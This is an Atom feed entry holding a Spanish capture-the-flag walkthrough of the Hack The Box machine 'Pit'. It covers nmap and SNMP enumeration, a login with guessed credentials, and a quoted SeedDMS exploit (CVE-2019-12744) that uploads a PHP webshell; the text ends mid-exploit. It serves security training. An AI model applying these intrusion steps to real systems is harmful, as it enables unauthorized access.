<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>BinLAB</title>
 <link href="http://0.0.0.0:80http://0.0.0.0:80/atom.xml" rel="self"/>
 <link href="http://0.0.0.0:80http://0.0.0.0:80/"/>
 <updated>2021-09-25T18:02:26+00:00</updated>
 <id>http://0.0.0.0:80</id>
 <author>
   <name>p0wex</name>
   <email>your-email@email.com</email>
 </author>

 
 <entry>
   <title>Pit</title>
   <link href="http://0.0.0.0:80http://0.0.0.0:80/2021/09/25/pit"/>
   <updated>2021-09-25T00:00:00+00:00</updated>
   <id>http://0.0.0.0:80/2021/09/25/pit</id>
   <content type="html">&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/134777660-4de10361-6209-4001-8945-4fd44dd01fd2.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Máquina Linux de nivel medio creada por &lt;a href=&quot;https://app.hackthebox.eu/users/159204&quot;&gt;polarbearer&lt;/a&gt; y &lt;a href=&quot;https://app.hackthebox.eu/users/125033&quot;&gt;GibParadox&lt;/a&gt;. Vamos a darnos un paseo por el servicio SNMP para encontrar un lugar oculto con el que podemos ejecutar comandos, entraremos en un panel de control con una shell expuesta y volveremos a pasearnos por el SNMP para convertirnos en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Veamos como clasifica la gente esta gran máquina:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/134777685-3d30f47e-5b3a-4bf4-97eb-41aaba7c35f1.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;No muy real pero va a haber que enumerar a muerte y hacer algo de explotación personalizada, interesante.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;#recon&quot;&gt;Reconocimiento inicial&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#snmp&quot;&gt;Enumeramos el servicio SNMP&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#rce&quot;&gt;Conseguimos RCE&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#shell&quot;&gt;Conseguimos acceso&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#root&quot;&gt;Rooted!&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;recon&quot;&gt;Reconocimiento inicial&lt;/h1&gt;

&lt;p&gt;Como siempre, empezamos con un escaneo del poderoso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;. Yo he hecho todo el escaneo TCP en el mismo comando, aunque también se puede hacer por separado.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.92 scan initiated Sat Sep 25 17:59:25 2021 as: nmap -p- --open -n -vv -sS --min-rate 4000 -sCV -oN scan 10.10.10.241&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.241
Host is up, received echo-reply ttl 63 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.28s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Scanned at 2021-09-25 17:59:26 CEST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;224s
Not shown: 65494 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 38 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;admin-prohibited&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPRtC3Zd+DPBo1Raur/oVw/vz3BFbDkm6wmyb+E+0kBcgsDzm+UZqGn3u+rbI9L7PtNCIOTHa4j0Qs6fD9C
| &amp;lt;más cosas&amp;gt;
| /Jo4ziDVVkRvPIHh06Se7NRVzbRtO8mBTFbi/Efag8QtLHeLDnF5SJj5SdTBiMiLvyGNWs3UySweOazyijw5bQtlgKbZHy0tLsjOCWjTuXGHAS3pHkkgSYKfr
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBASBJvHyFZwgmAuf2qWsMHborC5pS152XK8TVyTESkcPGWHqVA
|   256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmDbvdFwHALNAnJDXuRD6aO9yppoVnKbTLbUmn6CWUn
80/tcp   open  http            syn-ack ttl 63 nginx 1.14.1
|_http-title: Test Page &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the Nginx HTTP Server on Red Hat Enterprise Linux
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.1
9090/tcp open  ssl/zeus-admin? syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE html&amp;gt;
|     &amp;lt;html&amp;gt;
|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
|     &amp;lt;title&amp;gt;
|     request
|     &amp;lt;/title&amp;gt;
|     &amp;lt;meta http-equiv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/html; charset=utf-8&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
|     &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;width=device-width, initial-scale=1.0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
|     &amp;lt;style&amp;gt;
|     body &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
|     margin: 0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
|     font-family: &lt;span class=&quot;s2&quot;&gt;&quot;RedHatDisplay&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;Open Sans&quot;&lt;/span&gt;, Helvetica, Arial, sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
|     font-size: 12px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
|     line-height: 1.66666667&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
|     color: &lt;span class=&quot;c&quot;&gt;#333333;&lt;/span&gt;
|     background-color: &lt;span class=&quot;c&quot;&gt;#f5f5f5;&lt;/span&gt;
|     border: 0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
|     vertical-align: middle&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
|     font-weight: 300&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
|_    margin: 0 0 10p
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dms-pit.htb/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4cd9329523184b0ea52ba0d20a1a6f92/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Issuer: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dms-pit.htb/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4cd9329523184b0ea52ba0d20a1a6f92/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;US/organizationalUnitName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ca-5763051739999573755
| Public Key &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-16T23:29:12
| Not valid after:  2030-06-04T16:09:12
| MD5:   0146 4fba 4de8 5bef 0331 e57e 41b4 a8ae
| SHA-1: 29f2 edc3 7ae9 0c25 2a9d 3feb 3d90 bde6 dfd3 eee5
| &lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; CERTIFICATE-----
| MIIEpjCCAo6gAwIBAgIISl2h4yex5dEwDQYJKoZIhvcNAQELBQAwbzELMAkGA1UE
| BhMCVVMxKTAnBgNVBAoMIDRjZDkzMjk1MjMxODRiMGVhNTJiYTBkMjBhMWE2Zjky
| MR8wHQYDVQQLDBZjYS01NzYzMDUxNzM5OTk5NTczNzU1MRQwEgYDVQQDDAtkbXMt
| cGl0Lmh0YjAeFw0yMDA0MTYyMzI5MTJaFw0zMDA2MDQxNjA5MTJaME4xCzAJBgNV
| BAYTAlVTMSkwJwYDVQQKDCA0Y2Q5MzI5NTIzMTg0YjBlYTUyYmEwZDIwYTFhNmY5
| MjEUMBIGA1UEAwwLZG1zLXBpdC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
| ggEKAoIBAQDZLaNRUf3BXYCd+Df9XZwMBmIwGzy/yX+9fPY6zGXYEYS7SeH9xZ7p
| GTUQMfk30Olb7rzftCKx9xSMHyoCJIAWFeVDV9vxJbGaEqFRvKHPeqcpQbRAKoqL
| xWaqbDZCXsBtTVYEwpRHvJ/GoGEWAQSbP1zkHzvVBkHuXE7Sj0zlW5NaBjvG/wEe
| wAB6crwnIYoqC550cMPritvjLwijk9nhwaPJ462anhJR5vFBvkR4nqD3mhIytUOb
| YMsfVoI0FiXtlBdu1ApABxtIdQgkY94eRAaMTkQ4Je0a8G5PlRZ20xCdqHb3xIZV
| 1mphZehkUeN0MzgEloL5TX8Zab+LZW+ZAgMBAAGjZzBlMA4GA1UdDwEB/wQEAwIF
| oDAJBgNVHRMEAjAAMCcGA1UdEQQgMB6CC2Rtcy1waXQuaHRigglsb2NhbGhvc3SH
| BH8AAAEwHwYDVR0jBBgwFoAUc8ssOet8O2a3+F2If4eQixSV7PwwDQYJKoZIhvcN
| AQELBQADggIBAG8kou51q78wdzxiPejMv9qhWlBWW3Ly5TvAav07ATx8haldEHvT
| LlFNGPDFAvJvcKguiHnGrEL9Im5GDuzi31V4fE5xjzWJdkepXasK7NzIciC0IwgP
| 7G1j11OUJOt9pmDRu2FkTHsSdr5b57P4uXS8rRF5lLCEafuemk6ORXa07b9xSrhC
| 3pWl22RtVlTFQ3wX8OsY0O3w5UUz8T/ezhKYUoM/mYQu+ICTAltlX4xae6PGauCh
| uaOY+/dPtM17KfHSbnCS1ZnR0oQ4BXJuYNfOR/C59L5B7TWzaOx5n1TD6JHOzrDu
| LxjO0OTeFaBRXL/s2Z5zNPTpZVnHyKEmHr5ZObjR6drDGqXfShPq5y70RfE28Pxm
| VTCdK4MCqDkELIlXrxzHQ/IPC8pxho6WEQsY80xZ1nXbLshlymh6clgblOetToZT
| HObIkEoPBtszUssFmWSN5hd4JcuyqSbJhichYtFQRASb2I4jWdP831LPir+MCGQv
| iAnieBF8zYus7kboTwfXmBGUt6r6eNE1yr4ZXPxOZoWq2ob6aAeLp2mqif+jgUSk
| fiG9oiAoyXWxw5pLfYHxVQGY+rGbjOs8gCAxBaTPt6dCkHZy/nU8PNZtV6QC4OME
| LI/sYtmG8XENdQhsLM2sewOMvv5rgsZ8SlX05Bw8C1xuq5Rg1KewCjlY
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time
&lt;/span&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.92%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SSL%I&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;9/25%Time&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;614F47BF%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gn
&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; no nos interesa :p &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
SF:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20margin:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;200&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;200&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2010p&lt;span class=&quot;s2&quot;&gt;&quot;);

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 25 18:03:10 2021 -- 1 IP address (1 host up) scanned in 224.81 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;pequeña-explicación-de-los-parámetros-de-nmap&quot;&gt;Pequeña explicación de los parámetros de nmap&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;-p-: Escanea todos los puertos.&lt;/li&gt;
  &lt;li&gt;–open: Solo muestra los que están abiertos.&lt;/li&gt;
  &lt;li&gt;–min-rate: Envía un mínimo de paquetes por segundo para que vaya más rápido, con un número muy alto, como 10000, puede dar falsos positivos o negativos.&lt;/li&gt;
  &lt;li&gt;-sS: TCP SYN Port Scan, agiliza un poco el escaneo ya que no espera a que se complete el &lt;a href=&quot;https://networksigma.com/tcp-3-way-handshake/&quot;&gt;Three-Way Handshake&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;-Pn: Deshabilita el descubrimiento de host mediante el protocolo ARP a la máquina para comprobar si está activa (no confundir con pene, que luego pasan cosas).&lt;/li&gt;
  &lt;li&gt;-n: Deshabilita la resolución DNS.&lt;/li&gt;
  &lt;li&gt;-v: Muestra los puertos a medida que los descubre.&lt;/li&gt;
  &lt;li&gt;-oN: Guarda el escaneo como aparece por consola.&lt;/li&gt;
  &lt;li&gt;-sCV: Lanza unos scripts básicos de enumeración y detecta la versión que corre cada servicio.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Bueno, pues tenemos estos puertos abiertos:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SSH, para obtener una shell segura&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nginx 1.14.1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;9090&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Se supone que zeus-admin, pero ni nmap lo sabe&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Y además un subdominio, que está en el certificado del puerto 9090, dms-pit.htb, lo que nos indica que el dominio pit.htb existe, entonces habría que agregar esto al archivo /etc/hosts&lt;/p&gt;

&lt;h3 id=&quot;puerto-80&quot;&gt;Puerto 80&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/134778228-1b5c3f89-d71c-465f-be8f-c3caa4d54e3b.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Na’ de na’.&lt;/p&gt;

&lt;h3 id=&quot;puerto-9090&quot;&gt;Puerto 9090&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/134778282-01f9c06b-d2e5-40e5-b997-d42b3540e037.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Un panel de login(para el que no tenemos credenciales, obviamente 😔), un dominio(pit.htb) y nos dice la distro que usa, CentOS.&lt;/p&gt;

&lt;h1 id=&quot;snmp&quot;&gt;Enumeramos el servicio SNMP&lt;/h1&gt;
&lt;p&gt;Visto lo visto, no tenemos formas de comprometer la máquina, así que nos vemos en la siguiente. A menos… que tenga alguna cosilla por UDP, que no se usa mucho en esta plataforma.&lt;/p&gt;

&lt;p&gt;Hice un escaneo de todos los puertos que no me reportaba nada, así que hice uno más específico. Recordé la máquina Mischief, que la hicieron s4vitar(no encontré el stream) e &lt;a href=&quot;https://youtube.com/watch?v=GKo6xoB1g4Q&quot;&gt;ippsec&lt;/a&gt;, en la que hacen un escaneo del puerto 161 por UDP, para luego usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onesixtyone&lt;/code&gt;, que bruteforcea la &lt;a href=&quot;https://www.dnsstuff.com/snmp-community-string&quot;&gt;community string&lt;/a&gt; del servicio SNMP, y luego usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snmpwalk&lt;/code&gt; para enumerar procesos internos de la máquina.&lt;/p&gt;

&lt;p&gt;Y si comprobamos si el puerto 161 en UDP está abierto…&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.92 scan initiated Sat Sep 25 18:25:43 2021 as: nmap -p161 -sU -oN udp 10.10.10.241&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.241
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.052s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT    STATE SERVICE
161/udp open  snmp

&lt;span class=&quot;c&quot;&gt;# Nmap done at Sat Sep 25 18:25:43 2021 -- 1 IP address (1 host up) scanned in 0.34 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lo estáaaaaaa, así que podemos usar estas herramientas para comprometer la máquina.
Las community strings de este SNMP estaban por defecto, así que no hizo falta usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onesixtyone&lt;/code&gt; para hacer fuerza bruta, únicamente &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snmpwalk&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SNMPv2-MIB::sysDescr.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 &lt;span class=&quot;c&quot;&gt;#1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_64&lt;/span&gt;
SNMPv2-MIB::sysObjectID.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;12802197&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1 day, 11:33:41.97
SNMPv2-MIB::sysContact.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: Root &amp;lt;root@localhost&amp;gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;configure /etc/snmp/snmp.local.conf&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SNMPv2-MIB::sysName.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: pit.htb
SNMPv2-MIB::sysLocation.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: Unknown &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;edit /etc/snmp/snmpd.conf&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&amp;lt;cositas que no sirven&amp;gt;
UCD-SNMP-MIB::prErrFixCmd.1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: 
UCD-SNMP-MIB::dskPath.1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: /
UCD-SNMP-MIB::dskPath.2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: /var/www/html/seeddms51x/seeddms
&amp;lt;más cosas&amp;gt;
NET-SNMP-EXTEND-MIB::nsExtendCommand.&lt;span class=&quot;s2&quot;&gt;&quot;monitoring&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: /usr/bin/monitor
&amp;lt;más cosas aún&amp;gt;
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&quot;s2&quot;&gt;&quot;monitoring&quot;&lt;/span&gt;.23 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: login
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&quot;s2&quot;&gt;&quot;monitoring&quot;&lt;/span&gt;.24 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&quot;s2&quot;&gt;&quot;monitoring&quot;&lt;/span&gt;.25 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: Login Name           SELinux User         MLS/MCS Range        Service
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&quot;s2&quot;&gt;&quot;monitoring&quot;&lt;/span&gt;.26 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&quot;s2&quot;&gt;&quot;monitoring&quot;&lt;/span&gt;.27 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: __default__          unconfined_u         s0-s0:c0.c1023       &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&quot;s2&quot;&gt;&quot;monitoring&quot;&lt;/span&gt;.28 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: michelle             user_u               s0                   &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&quot;s2&quot;&gt;&quot;monitoring&quot;&lt;/span&gt;.29 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: root                 unconfined_u         s0-s0:c0.c1023       &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&quot;s2&quot;&gt;&quot;monitoring&quot;&lt;/span&gt;.30 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: System &lt;span class=&quot;nb&quot;&gt;uptime
&lt;/span&gt;NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&quot;s2&quot;&gt;&quot;monitoring&quot;&lt;/span&gt;.31 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING:  12:45:19 up 1 day, 11:35,  1 user,  load average: 0.28, 0.07, 0.02
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&quot;s2&quot;&gt;&quot;monitoring&quot;&lt;/span&gt;.31 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; No more variables left &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this MIB View &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;It is past the end of the MIB tree&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;:000 una ruta nueva, dos usuarios(root y michelle), y lo que parece que es un binario.&lt;/p&gt;

&lt;h1 id=&quot;rce&quot;&gt;Conseguimos RCE&lt;/h1&gt;

&lt;p&gt;Ahora que tenemos una ruta para hacer cositas 😈, podemos ver si usa algún gestor de contenidos vulnerable y a partir de ahí seguir partiéndolo.
Si nos dirigimos a dms-pit.htb/seeddms51x/seeddms nos topamos con un login.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/134779941-3f8b6186-c9c6-4d9b-9048-d7f81f9aebaa.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Abajo nos está diciendo que el acceso solo se permite a personal autorizado, y yo no lo soy, así que ya hemos terminado, espero que os haya gustado 😄.&lt;/p&gt;

&lt;p&gt;O nos ponemos un poco blackhat y entramos. Como teníamos un usuario llamado michelle, podríamos probar las credenciales &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;michelle:michelle&lt;/code&gt; y pa’ dentro.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/134780028-e7a5a303-5497-4c74-93c2-9988de31b3ea.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En efecto, pa’ dentro. Vemos una carpeta llamada Docs y una nota llamada ‘Upgrade Note’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/134780042-b2b7ecc7-8ad1-4f0f-aad2-bb40e6262448.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La nota dice que han actualizado SeedDMS a la versión 5.1.15 por problemas de seguridad, y así ya sabemos qué exploits NO probar, aunque igual funcionan…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/134780074-6a3fa968-258e-4998-9f52-e71fce5bbad3.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Viendo los exploits disponibles, el que más llama la atención es la RCE, aunque es para una versión anterior. No sé por qué, el exploit funciona, yo creo que la nota ha sido un farol para evitar que los hackeen.&lt;/p&gt;

&lt;p&gt;Este es el exploit:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions &amp;lt;5.1.11]
# Google Dork: [NA]
# Date: [20-June-2019]
# Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)
# Vendor Homepage: [https://www.seeddms.org]
# Software Link: [https://sourceforge.net/projects/seeddms/files/]
# Version: [SeedDMS versions &amp;lt;5.1.11] (REQUIRED)
# Tested on: [NA]
# CVE : [CVE-2019-12744]

Exploit Steps:

Step 1: Login to the application and under any folder add a document.
Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.

